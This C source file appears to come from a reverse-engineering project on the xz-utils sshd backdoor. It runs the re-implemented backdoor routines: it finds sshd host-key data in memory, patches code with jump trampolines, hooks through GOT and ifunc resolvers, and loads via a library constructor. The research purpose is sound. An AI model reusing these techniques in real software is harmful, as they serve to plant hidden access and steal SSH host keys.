/*
 * Copyright (C) 2024 Stefano Moioli <smxdev4@gmail.com>
 **/
#define _GNU_SOURCE
#include "xzre.h"
#include <elf.h>
#include <link.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
#ifdef USE_PHP
#include <sapi/embed/php_embed.h>
#endif

extern const char *X86_OPCODE_NAMES[];
extern const int X86_OPCODE_NAMES_COUNT;

const char *StringXrefName[] = {
	"XREF_xcalloc_zero_size",
	"XREF_Could_not_chdir_to_home_directory_s_s",
	"XREF_list_hostkey_types",
	"XREF_demote_sensitive_data",
	"XREF_mm_terminate",
	"XREF_mm_pty_allocate",
	"XREF_mm_do_pam_account",
	"XREF_mm_session_pty_cleanup2",
	"XREF_mm_getpwnamallow",
	"XREF_mm_sshpam_init_ctx",
	"XREF_mm_sshpam_query",
	"XREF_mm_sshpam_respond",
	"XREF_mm_sshpam_free_ctx",
	"XREF_mm_choose_dh",
	"XREF_sshpam_respond",
	"XREF_sshpam_auth_passwd",
	"XREF_sshpam_query",
	"XREF_start_pam",
	"XREF_mm_request_send",
	"XREF_mm_log_handler",
	"XREF_Could_not_get_agent_socket",
	"XREF_auth_root_allowed",
	"XREF_mm_answer_authpassword",
	"XREF_mm_answer_keyallowed",
	"XREF_mm_answer_keyverify",
	"XREF_48s_48s_d_pid_ld_",
	"XREF_Unrecognized_internal_syslog_level_code_d"
};

extern void dasm_sample(void);
extern void dasm_sample_end();
extern void dasm_sample_dummy_location();
extern BOOL secret_data_append_trampoline(secret_data_shift_cursor_t shift_cursor, unsigned shift_count);

static global_context_t my_global_ctx = { 0 };
static global_context_t* my_global_ctx_ptr = &my_global_ctx;

/**
 * @brief disables all validation by marking all shift operations as executed
 */
void xzre_secret_data_bypass(){
	for(int i=0; i<ARRAY_SIZE(my_global_ctx.shift_operations); i++){
		my_global_ctx.shift_operations[i] = 1;
	}
}

#ifndef XZRE_SHARED
extern char __executable_start;
extern char __etext;

void xzre_secret_data_init(){
	global_ctx = &my_global_ctx;
	memset(global_ctx, 0x00, sizeof(*global_ctx));
	global_ctx->lzma_code_start = &__executable_start;
	global_ctx->lzma_code_end = &__etext;
}

void xzre_secret_data_test(){
	// disable x86_dasm shift slot
	my_global_ctx.shift_operations[2] = 1;

	secret_data_shift_cursor_t cursor = {
		.byte_index = 16,
		.bit_index = 0
	};

	if(secret_data_append_trampoline(cursor, 1)){
		puts("secret data push OK!");
		hexdump(my_global_ctx.secret_data, sizeof(my_global_ctx.secret_data));
	} else {
		puts("secret data push FAIL!");
	}
}
#else
void xzre_secret_data_init(){}
void xzre_secret_data_test(){}
#endif

static void *get_elf_base(const char *path){
	char cmdBuf[128];
	char template[] = "grep -E 'r--p 00000000.*%s' /proc/%d/maps | cut -d '-' -f1";
	snprintf(cmdBuf, sizeof(cmdBuf), template, path, getpid());
	FILE *hProc = popen(cmdBuf, "r");
	memset(cmdBuf, 0x00, sizeof(cmdBuf));
	char *s = fgets(cmdBuf, sizeof(cmdBuf), hProc);
	pclose(hProc);
	if(!s) return NULL;
	u64 addr = strtoull(s, NULL, 16);
	return (void *)addr;
}

/**
 * @brief quick and dirty hack to get the ldso ELF location
 * 
 * @return void* 
 */
static void *get_ldso_elf(){
	return get_elf_base("/usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2");
}

/**
 * @brief quick and dirty hack to get the main ELF location
 * 
 * @return void* 
 */
static void *get_main_elf(){
	return get_elf_base("/usr/sbin/sshd");
}

#define WRITE(ptr, t, v) \
	do { \
		*(t *)(ptr) = v; \
		ptr = (uint8_t *)(ptr) + sizeof(t); \
	} while(0)

#define WRITE8(ptr, v) WRITE(ptr, uint8_t, v)
#define WRITE16(ptr, v) WRITE(ptr, uint16_t, v)
#define WRITE32(ptr, v) WRITE(ptr, uint32_t, v)

int inj_build_abs_jump(uint8_t *buffer, void *jump_destination, void *jump_opcode_address) {
	(void)(jump_opcode_address);

	uint64_t target = (uint64_t)jump_destination;

	uint32_t lo = target & 0xFFFFFFFF;
	uint32_t hi = ((target >> 32) & 0xFFFFFFFF);

	// 0: 68 44 33 22 11    push $11223344
	WRITE8(buffer, 0x68);
	WRITE32(buffer, lo);

	// 5: c7 44 24 04 88 77 66 55    mov 4(%rsp), 55667788  # upper 4 bytes
	WRITE32(buffer, 0x042444C7);
	WRITE32(buffer, hi);

	//d: c3                retq
	WRITE8(buffer, 0xC3);
	return 0;
}

void hooked_update_got_address(elf_entry_ctx_t *entry_ctx){
	// no-op
	return;
}

void xzre_backdoor_setup(){
	void *linker_return = __builtin_return_address(1);
	void *ldso_elf = get_ldso_elf();
	
	/** setup fake GOT */
	u64 fake_got[] = {
		0,0,0,
		(u64)ldso_elf
	};
	
	/** setup fake entry frame to point to reference the fake got */
	elf_entry_ctx_t my_entry_ctx = {
		.frame_address = ldso_elf,
		.got_ctx.got_ptr = &fake_got
	};

	/** patch the GOT recompute function to be a no-op */
	u8 jmp_buf[14];
	inj_build_abs_jump(jmp_buf, &hooked_update_got_address, NULL);
	size_t pagesz = getpagesize();
	size_t pagemask = pagesz-1;
	u8 *code = (u8 *)&update_got_address;
	uptr code_addr = UPTR(code) & ~pagemask;
	if(mprotect((void *)code_addr, pagesz, PROT_READ|PROT_WRITE|PROT_EXEC) < 0){
		perror("mprotect failed");
		return;
	}
	memcpy(code, jmp_buf, sizeof(jmp_buf));
	
	/** make backdoor relro data writable */
	mprotect((void *)(UPTR(&fake_lzma_allocator) & ~pagemask), pagesz, PROT_READ|PROT_WRITE);
	
	backdoor_hooks_ctx_t hook_params;
	int ret = init_hooks_ctx(&hook_params);

	backdoor_shared_globals_t shared = {
		.globals = &my_global_ctx_ptr
	};
	backdoor_setup_params_t para = {
		.entry_ctx = &my_entry_ctx,
		.shared = &shared,
		.hook_params = &hook_params
	};
	printf("pid is %d\n", getpid());
	//asm volatile("jmp .");
	if(!backdoor_setup(&para)){
		puts("backdoor_setup() FAIL");
	}
}

#ifdef USE_PHP
int run_php(int argc, char *argv[]){
	int rc = EXIT_FAILURE;
	PHP_EMBED_START_BLOCK(argc, argv)
	do {
		zend_file_handle file_handle;
		zend_stream_init_filename(&file_handle, argv[0]);

		if(php_execute_script(&file_handle) == FAILURE){
			break;
		}
		rc = EXIT_SUCCESS;
	} while(0);
	PHP_EMBED_END_BLOCK()

	return rc;
}
#endif

static inline __attribute__((always_inline))
void main_shared(){
	char *trigger = getenv("XZRE_MAIN");
	if(!trigger || strcmp(trigger, "1")){
		return;
	}
	unsetenv("XZRE_MAIN");

	#ifdef USE_PHP
	char *xzre_dir = getenv("XZRE_DIR");
	if(xzre_dir){
		char *php_script = NULL;
		asprintf(&php_script, "%s/sshd.php", xzre_dir);
		char *php_argv[] = {php_script, "-sshd"};
		run_php(ARRAY_SIZE(php_argv), php_argv);
		free(php_script);
	}
	return;
	#endif

	// prevent fork bomb in system command
	unsetenv("LD_PRELOAD");
	xzre_secret_data_bypass();
	
	void *elf_addr = get_main_elf();
	if(!elf_addr){
		puts("Failed to get main elf");
		return;
	}

	elf_handles_t handles = {0};
	elf_info_t einfo;
	if(!elf_parse(elf_addr, &einfo)){
		puts("elf_parse failed");
		return;
	}

	/** populate the string references table, and dump it */
	string_references_t strings = { 0 };
	elf_find_string_references(&einfo, &strings);
	for(int i=0; i<ARRAY_SIZE(strings.entries); i++){
		string_item_t *item = &strings.entries[i];
		printf(
			"----> %s\n"
			"str %2d: id=0x%x, start=%p, end=%p, xref=%p (size: 0x%04zx, xref_offset: 0x%04zx)\n"
			"RVA_start: 0x%tx, RVA_end: 0x%tx, RVA_xref: 0x%tx\n\n",
			StringXrefName[i],
				i, item->string_id, item->func_start, item->func_end, item->xref,
				(item->func_start && item->func_end) ? PTRDIFF(item->func_end, item->func_start) : 0,
				(item->func_start && item->xref) ? PTRDIFF(item->xref, item->func_start) : 0,
				item->func_start ? PTRDIFF(item->func_start, elf_addr) : 0,
				item->func_end ? PTRDIFF(item->func_end, elf_addr) : 0,
				item->xref ? PTRDIFF(item->xref, elf_addr) : 0);
	}

	printf("BASE ADDR: %p\n", einfo.elfbase);


	u64 code_size = 0, data_size = 0;
	void *data_start = elf_get_data_segment(&einfo, &data_size, 0);
	void *data_end = (void *)PTRADD(data_start, data_size);
	void *code_start = elf_get_code_segment(&einfo, &code_size);
	void *code_end = (void *)PTRADD(code_start, code_size);
	void *ssh_host_keys1 = NULL;
	if(sshd_get_sensitive_data_address_via_xcalloc(data_start, data_end, code_start, code_end, &strings, &ssh_host_keys1)){
		printf("sensitive_data.host_keys: %p\n", ssh_host_keys1);
	}

	void *ssh_host_keys2 = NULL;
	void *getenv_krb5ccname = elf_find_string_reference(&einfo, STR_KRB5CCNAME, code_start, code_end);
	printf("xref: %p\n", getenv_krb5ccname);
	if(sshd_get_sensitive_data_address_via_krb5ccname(data_start, data_end, code_start, code_end, &ssh_host_keys2, &einfo)){
		printf("sensitive_data.host_keys: %p\n", ssh_host_keys2);
	}

	int score = sshd_get_sensitive_data_score(ssh_host_keys1, &einfo, &strings);
	printf("sshd_get_sensitive_data_score(): %d\n", score);

	sshd_ctx_t sshd_ctx;
	sshd_log_ctx_t sshd_log_ctx;

	void *fn_start = NULL;
	void *fn_end = NULL;
	void *fn_fptr_addr = NULL;
	global_context_t ctx = {
		.uses_endbr64 = TRUE,
		.sshd_ctx = &sshd_ctx,
		.sshd_log_ctx = &sshd_log_ctx
	};
	if(elf_find_function_pointer(XREF_mm_answer_keyverify,
		&fn_start, &fn_end, &fn_fptr_addr,
		&einfo, &strings, &ctx
	)){
		sshd_ctx.mm_answer_keyverify_start = fn_start;
		sshd_ctx.mm_answer_keyverify_end = fn_end;
		sshd_ctx.have_mm_answer_keyverify = TRUE;
		printf("keyVerify: start=%p, end=%p, fptr_addr=%p\n",
			fn_start,
			fn_end,
			fn_fptr_addr);
	}

	//xzre_backdoor_setup();
	puts("main_shared(): OK");
}


void print_opcode_mask(u64 mask, int mask_offset, BOOL only_print_allowed){
	for(unsigned i=0x80 + mask_offset; mask; mask >>= 1, i++){
		// bit 1: this opcode is allowed
		BOOL allowed = (mask & 1) == 1;
		if(!allowed && only_print_allowed) continue;
		printf("%s 0x%"PRIX8" (0x%"PRIX8") -> %s\n",
			(allowed) ? "+" : "-",
			(u8)i, XZDASM_OPC(i),
			XZDASM_OPC(i) < X86_OPCODE_NAMES_COUNT
				? X86_OPCODE_NAMES[XZDASM_OPC(i)]
				: "?"
		);
	}
}

void print_opcode_masks(){
	puts("find_reg2reg_instruction instruction mask");
	print_opcode_mask(0x505050500000505, 1, TRUE);
	puts("secret_data_append_from_instruction mask");
	print_opcode_mask(0x410100000101, 3, TRUE);
}

int main(int argc, char *argv[]){
	puts("xzre 0.1 by Smx :)");

	print_opcode_masks();

	dasm_ctx_t ctx = {0};
	u8 *start = (u8 *)&dasm_sample;
	for(int i=0;; start += ctx.instruction_size, i++){
		int res = x86_dasm(&ctx, start, (u8 *)&dasm_sample_end);
		if(!res) break;
		//hexdump(&ctx, sizeof(ctx));
		printf(
			"[%2d]: opcode: 0x%08"PRIx32" (orig:0x%08"PRIX32")  (l: %2"PRIu64") -- "
			"modrm: 0x%02"PRIx8" (mod:%"PRId8", reg:%"PRId8", rm:%"PRId8") -> 0x%08"PRIx32", operand: %"PRIx64", mem_disp: %"PRIx64", rex: 0x%"PRIX8", rex.br: %d, f: %02"PRIx8"\n",
			i,
			XZDASM_OPC(ctx.opcode), ctx.opcode,
			ctx.instruction_size,
			ctx.modrm,
			ctx.modrm_mod, ctx.modrm_reg, ctx.modrm_rm,
			ctx.modrm_word,
			ctx.operand,
			ctx.mem_disp,
			ctx.rex_byte,
			// 1: has rex.br, 0 otherwise
			(ctx.rex_byte & 5) != 0,
			ctx.flags);
		printf("      --> ");
		for(int i=0; i<ctx.instruction_size; i++){
			printf("%02"PRIx8" ", ctx.instruction[i]);
		}
		printf("\n");
	};

	lzma_allocator *fake_allocator = get_lzma_allocator();
	printf(
		"fake_allocator: %p\n"
		" - alloc: %p\n"
		" - free: %p\n"
		" - opaque: %p\n",
		fake_allocator,
		fake_allocator->alloc,
		fake_allocator->free,
		fake_allocator->opaque
	);

	xzre_secret_data_init();
	xzre_secret_data_test();
	return 0;
}

#ifdef XZRE_SHARED
//#define REPLACE_RESOLVER

#include <syscall.h>
void __attribute__((constructor)) init(){
	main_shared();
}

static inline __attribute__((always_inline)) ssize_t inline_write(int fd, const void *buf, size_t size){
	ssize_t ret;
	asm volatile (
		"syscall"
		: "=a" (ret)
		//                 EDI      RSI       RDX
		: "0"(__NR_write), "D"(fd), "S"(buf), "d"(size)
		: "rcx", "r11", "memory"
	);
	return ret;
}

#ifdef REPLACE_RESOLVER
void *resolver(){
	#if 0
	char buf[] = "hijacked resolver!\n";
	inline_write(STDOUT_FILENO, buf, sizeof(buf));
	#endif
	return NULL;
}

uint32_t  __attribute__((ifunc("resolver"))) lzma_crc32(const uint8_t *buf, size_t size, uint32_t crc);
uint64_t  __attribute__((ifunc("resolver"))) lzma_crc64(const uint8_t *buf, size_t size, uint64_t crc);
#endif

#endif
